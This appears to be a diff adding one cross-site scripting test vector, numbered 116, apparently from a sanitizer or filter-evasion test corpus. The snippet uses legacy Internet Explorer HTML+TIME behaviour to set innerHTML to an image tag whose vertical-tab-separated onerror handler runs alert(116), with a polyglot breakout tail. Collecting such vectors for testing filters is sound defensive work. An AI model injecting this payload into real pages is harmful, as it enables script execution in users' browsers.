@@ -1,0 +1,4 @@
+<div id="116"><div id="x">x</div>
+<xml:namespace prefix="t">
+<import namespace="t" implementation="#default#time2">
+<t:set attributeName="innerHTML" targetElement="x" to="<img\u000Bsrc=x\u000Bonerror\u000B=alert(116)>">//["'`-->]]>]</div>
